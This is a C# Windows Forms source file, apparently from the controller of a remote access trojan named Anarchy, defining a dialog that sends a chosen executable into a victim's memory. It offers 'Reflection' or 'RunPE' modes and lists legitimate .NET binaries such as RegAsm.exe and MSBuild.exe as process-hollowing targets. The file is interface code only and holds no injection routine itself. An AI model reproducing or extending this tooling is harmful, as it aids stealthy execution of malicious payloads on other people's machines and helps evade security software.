using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Anarchy.Helpers.Helper;
using Guna.UI2.WinForms;
using ReaLTaiizor.Controls;
using Siticone.UI.WinForms;

namespace Anarchy.Forms;

public class FormSendFileToMemory : Form
{
    public bool IsOK;

    private IContainer components;

    private FoxLabel foxLabel1;

    private FoxLabel foxLabel2;

    private FoxLabel foxLabel3;

    public ToolStripStatusLabel toolStripStatusLabel1;

    private StatusStrip statusStrip1;

    private Guna2Panel guna2Panel2;

    private SiticoneControlBox siticoneControlBox4;

    private SiticoneControlBox siticoneControlBox3;

    internal Label Label22;

    private Guna2Button button1;

    private Guna2Button button2;

    public Guna2ComboBox comboBox1;

    public Guna2ComboBox comboBox2;

    private Guna2Elipse guna2Elipse1;

    private Guna2DragControl guna2DragControl1;

    public FoxLabel foxLabel4;

    public FormSendFileToMemory()
    {
        this.InitializeComponent();
    }

    private void SendFileToMemory_Load(object sender, EventArgs e)
    {
        this.comboBox1.SelectedIndex = 0;
        this.comboBox2.SelectedIndex = 0;
    }

    private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
    {
        switch (this.comboBox1.SelectedIndex)
        {
            case 1:
                this.foxLabel3.Visible = true;
                this.comboBox2.Visible = true;
                break;
            case 0:
                this.foxLabel3.Visible = false;
                this.comboBox2.Visible = false;
                break;
        }
    }

    private void button1_Click(object sender, EventArgs e)
    {
        using OpenFileDialog openFileDialog = new OpenFileDialog();
        openFileDialog.Filter = "(*.exe)|*.exe";
        if (openFileDialog.ShowDialog() == DialogResult.OK)
        {
            this.foxLabel4.Text = Path.GetFileName(openFileDialog.FileName);
            this.foxLabel4.Tag = openFileDialog.FileName;
            this.foxLabel4.ForeColor = Color.Green;
            this.IsOK = true;
            if (this.comboBox1.SelectedIndex == 0)
            {
                try
                {
                    new ReferenceLoader().AppDomainSetup(openFileDialog.FileName);
                    this.IsOK = true;
                    return;
                }
                catch
                {
                    this.foxLabel4.ForeColor = Color.Red;
                    this.foxLabel4.Text += " Invalid!";
                    this.IsOK = false;
                    return;
                }
            }
        }
        else
        {
            this.foxLabel4.Text = "";
            this.foxLabel4.ForeColor = Color.Black;
            this.IsOK = true;
        }
    }

    private void button2_Click(object sender, EventArgs e)
    {
        if (this.IsOK)
        {
            base.Hide();
        }
    }

    private void Button3_Click(object sender, EventArgs e)
    {
        this.IsOK = false;
        base.Hide();
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && this.components != null)
        {
            this.components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.components = new System.ComponentModel.Container();
        
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormSendFileToMemory));
        this.foxLabel1 = new ReaLTaiizor.Controls.FoxLabel();
        this.foxLabel4 = new ReaLTaiizor.Controls.FoxLabel();
        this.foxLabel2 = new ReaLTaiizor.Controls.FoxLabel();
        this.foxLabel3 = new ReaLTaiizor.Controls.FoxLabel();
        this.toolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
        this.statusStrip1 = new System.Windows.Forms.StatusStrip();
        this.guna2Panel2 = new Guna.UI2.WinForms.Guna2Panel();
        this.siticoneControlBox4 = new Siticone.UI.WinForms.SiticoneControlBox();
        this.siticoneControlBox3 = new Siticone.UI.WinForms.SiticoneControlBox();
        this.Label22 = new System.Windows.Forms.Label();
        this.comboBox1 = new Guna.UI2.WinForms.Guna2ComboBox();
        this.comboBox2 = new Guna.UI2.WinForms.Guna2ComboBox();
        this.button1 = new Guna.UI2.WinForms.Guna2Button();
        this.button2 = new Guna.UI2.WinForms.Guna2Button();
        this.guna2Elipse1 = new Guna.UI2.WinForms.Guna2Elipse(this.components);
        this.guna2DragControl1 = new Guna.UI2.WinForms.Guna2DragControl(this.components);
        this.statusStrip1.SuspendLayout();
        this.guna2Panel2.SuspendLayout();
        base.SuspendLayout();
        this.foxLabel1.Font = new System.Drawing.Font("Segoe UI", 10f, System.Drawing.FontStyle.Bold);
        this.foxLabel1.ForeColor = System.Drawing.Color.White;
        this.foxLabel1.Location = new System.Drawing.Point(10, 56);
        this.foxLabel1.Name = "foxLabel1";
        this.foxLabel1.Size = new System.Drawing.Size(36, 19);
        this.foxLabel1.TabIndex = 10;
        this.foxLabel1.Text = "Type:";
        this.foxLabel4.Font = new System.Drawing.Font("Segoe UI", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.foxLabel4.ForeColor = System.Drawing.Color.FromArgb(0, 192, 0);
        this.foxLabel4.Location = new System.Drawing.Point(305, 135);
        this.foxLabel4.Name = "foxLabel4";
        this.foxLabel4.Size = new System.Drawing.Size(183, 19);
        this.foxLabel4.TabIndex = 16;
        this.foxLabel2.Font = new System.Drawing.Font("Segoe UI", 10f, System.Drawing.FontStyle.Bold);
        this.foxLabel2.ForeColor = System.Drawing.Color.White;
        this.foxLabel2.Location = new System.Drawing.Point(12, 99);
        this.foxLabel2.Name = "foxLabel2";
        this.foxLabel2.Size = new System.Drawing.Size(36, 19);
        this.foxLabel2.TabIndex = 12;
        this.foxLabel2.Text = "File:";
        this.foxLabel3.Font = new System.Drawing.Font("Segoe UI", 10f, System.Drawing.FontStyle.Bold);
        this.foxLabel3.ForeColor = System.Drawing.Color.White;
        this.foxLabel3.Location = new System.Drawing.Point(12, 137);
        this.foxLabel3.Name = "foxLabel3";
        this.foxLabel3.Size = new System.Drawing.Size(48, 19);
        this.foxLabel3.TabIndex = 13;
        this.foxLabel3.Text = "Target:";
        this.toolStripStatusLabel1.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
        this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
        this.toolStripStatusLabel1.Size = new System.Drawing.Size(16, 17);
        this.toolStripStatusLabel1.Text = "...";
        this.statusStrip1.Dock = System.Windows.Forms.DockStyle.None;
        this.statusStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
        this.statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.toolStripStatusLabel1 });
        this.statusStrip1.Location = new System.Drawing.Point(364, 136);
        this.statusStrip1.Name = "statusStrip1";
        this.statusStrip1.Padding = new System.Windows.Forms.Padding(1, 0, 9, 0);
        this.statusStrip1.Size = new System.Drawing.Size(28, 22);
        this.statusStrip1.SizingGrip = false;
        this.statusStrip1.TabIndex = 2;
        this.statusStrip1.Text = "statusStrip1";
        this.statusStrip1.Visible = false;
        this.guna2Panel2.BackColor = System.Drawing.Color.Transparent;
        this.guna2Panel2.Controls.Add(this.siticoneControlBox4);
        this.guna2Panel2.Controls.Add(this.siticoneControlBox3);
        this.guna2Panel2.Controls.Add(this.Label22);
        this.guna2Panel2.CustomBorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
        this.guna2Panel2.CustomBorderThickness = new System.Windows.Forms.Padding(0, 0, 1, 0);
        this.guna2Panel2.Dock = System.Windows.Forms.DockStyle.Top;
        this.guna2Panel2.Location = new System.Drawing.Point(0, 0);
        this.guna2Panel2.Name = "guna2Panel2";
        this.guna2Panel2.ShadowDecoration.Color = System.Drawing.Color.White;
        this.guna2Panel2.ShadowDecoration.Depth = 15;
        this.guna2Panel2.Size = new System.Drawing.Size(500, 41);
        this.guna2Panel2.TabIndex = 29;
        this.siticoneControlBox4.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.siticoneControlBox4.BackColor = System.Drawing.Color.Transparent;
        this.siticoneControlBox4.BorderRadius = 10;
        this.siticoneControlBox4.ControlBoxType = Siticone.UI.WinForms.Enums.ControlBoxType.MinimizeBox;
        this.siticoneControlBox4.FillColor = System.Drawing.Color.Transparent;
        this.siticoneControlBox4.HoveredState.Parent = this.siticoneControlBox4;
        this.siticoneControlBox4.IconColor = System.Drawing.Color.White;
        this.siticoneControlBox4.Location = new System.Drawing.Point(401, 5);
        this.siticoneControlBox4.Name = "siticoneControlBox4";
        this.siticoneControlBox4.ShadowDecoration.Parent = this.siticoneControlBox4;
        this.siticoneControlBox4.Size = new System.Drawing.Size(45, 29);
        this.siticoneControlBox4.TabIndex = 21;
        this.siticoneControlBox3.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.siticoneControlBox3.BackColor = System.Drawing.Color.Transparent;
        this.siticoneControlBox3.BorderRadius = 10;
        this.siticoneControlBox3.FillColor = System.Drawing.Color.Transparent;
        this.siticoneControlBox3.HoveredState.Parent = this.siticoneControlBox3;
        this.siticoneControlBox3.IconColor = System.Drawing.Color.White;
        this.siticoneControlBox3.Location = new System.Drawing.Point(452, 5);
        this.siticoneControlBox3.Name = "siticoneControlBox3";
        this.siticoneControlBox3.PressedColor = System.Drawing.Color.DarkRed;
        this.siticoneControlBox3.ShadowDecoration.Parent = this.siticoneControlBox3;
        this.siticoneControlBox3.Size = new System.Drawing.Size(45, 29);
        this.siticoneControlBox3.TabIndex = 20;
        this.Label22.AutoSize = true;
        this.Label22.BackColor = System.Drawing.Color.Transparent;
        this.Label22.Font = new System.Drawing.Font("ProFont for Powerline", 15.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.Label22.ForeColor = System.Drawing.Color.White;
        this.Label22.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
        this.Label22.Location = new System.Drawing.Point(6, 10);
        this.Label22.Name = "Label22";
        this.Label22.Size = new System.Drawing.Size(241, 21);
        this.Label22.TabIndex = 19;
        this.Label22.Text = "  Local File [Memory]";
        this.comboBox1.BackColor = System.Drawing.Color.Transparent;
        this.comboBox1.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
        this.comboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
        this.comboBox1.DropDownWidth = 162;
        this.comboBox1.FillColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.comboBox1.FocusedColor = System.Drawing.Color.Empty;
        this.comboBox1.Font = new System.Drawing.Font("Segoe UI", 10f);
        this.comboBox1.ForeColor = System.Drawing.Color.FromArgb(255, 128, 0);
        this.comboBox1.FormattingEnabled = true;
        this.comboBox1.ItemHeight = 16;
        this.comboBox1.Items.AddRange(new object[2] { "Reflection", "RunPE" });
        this.comboBox1.Location = new System.Drawing.Point(48, 54);
        this.comboBox1.Name = "comboBox1";
        this.comboBox1.Size = new System.Drawing.Size(135, 22);
        this.comboBox1.Style = Guna.UI2.WinForms.Enums.TextBoxStyle.Material;
        this.comboBox1.TabIndex = 51;
        this.comboBox1.SelectedIndexChanged += new System.EventHandler(comboBox1_SelectedIndexChanged);
        this.comboBox2.BackColor = System.Drawing.Color.Transparent;
        this.comboBox2.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
        this.comboBox2.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
        this.comboBox2.DropDownWidth = 162;
        this.comboBox2.FillColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.comboBox2.FocusedColor = System.Drawing.Color.Empty;
        this.comboBox2.Font = new System.Drawing.Font("Segoe UI", 10f);
        this.comboBox2.ForeColor = System.Drawing.Color.FromArgb(255, 128, 0);
        this.comboBox2.FormattingEnabled = true;
        this.comboBox2.ItemHeight = 16;
        this.comboBox2.Items.AddRange(new object[5] { "aspnet_compiler.exe", "RegAsm.exe", "MSBuild.exe", "RegSvcs.exe", "vbc.exe" });
        this.comboBox2.Location = new System.Drawing.Point(64, 135);
        this.comboBox2.Name = "comboBox2";
        this.comboBox2.Size = new System.Drawing.Size(135, 22);
        this.comboBox2.Style = Guna.UI2.WinForms.Enums.TextBoxStyle.Material;
        this.comboBox2.TabIndex = 52;
        this.button1.Animated = true;
        this.button1.BorderRadius = 10;
        this.button1.FillColor = System.Drawing.Color.FromArgb(255, 128, 0);
        this.button1.Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.button1.ForeColor = System.Drawing.Color.White;
        this.button1.Location = new System.Drawing.Point(44, 93);
        this.button1.Name = "button1";
        this.button1.Size = new System.Drawing.Size(127, 30);
        this.button1.TabIndex = 53;
        this.button1.Text = "Select";
        this.button1.Click += new System.EventHandler(button1_Click);
        this.button2.Animated = true;
        this.button2.BorderRadius = 10;
        this.button2.FillColor = System.Drawing.Color.FromArgb(255, 128, 0);
        this.button2.Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.button2.ForeColor = System.Drawing.Color.White;
        this.button2.Location = new System.Drawing.Point(365, 54);
        this.button2.Name = "button2";
        this.button2.Size = new System.Drawing.Size(123, 30);
        this.button2.TabIndex = 54;
        this.button2.Text = "Send";
        this.button2.Click += new System.EventHandler(button2_Click);
        this.guna2Elipse1.BorderRadius = 15;
        this.guna2Elipse1.TargetControl = this;
        this.guna2DragControl1.DockIndicatorTransparencyValue = 0.6;
        this.guna2DragControl1.TargetControl = this.guna2Panel2;
        this.guna2DragControl1.UseTransparentDrag = true;
        base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        this.BackColor = System.Drawing.Color.FromArgb(30, 32, 37);
        base.ClientSize = new System.Drawing.Size(500, 170);
        base.Controls.Add(this.button2);
        base.Controls.Add(this.button1);
        base.Controls.Add(this.comboBox2);
        base.Controls.Add(this.comboBox1);
        base.Controls.Add(this.guna2Panel2);
        base.Controls.Add(this.foxLabel4);
        base.Controls.Add(this.foxLabel3);
        base.Controls.Add(this.foxLabel2);
        base.Controls.Add(this.foxLabel1);
        base.Controls.Add(this.statusStrip1);
        base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
        base.Margin = new System.Windows.Forms.Padding(2);
        base.MaximizeBox = false;
        this.MaximumSize = new System.Drawing.Size(1920, 1080);
        base.MinimizeBox = false;
        this.MinimumSize = new System.Drawing.Size(190, 40);
        base.Name = "FormSendFileToMemory";
        base.ShowIcon = false;
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "Injection";
        base.Load += new System.EventHandler(SendFileToMemory_Load);
        this.statusStrip1.ResumeLayout(false);
        this.statusStrip1.PerformLayout();
        this.guna2Panel2.ResumeLayout(false);
        this.guna2Panel2.PerformLayout();
        base.ResumeLayout(false);
        base.PerformLayout();
    }
}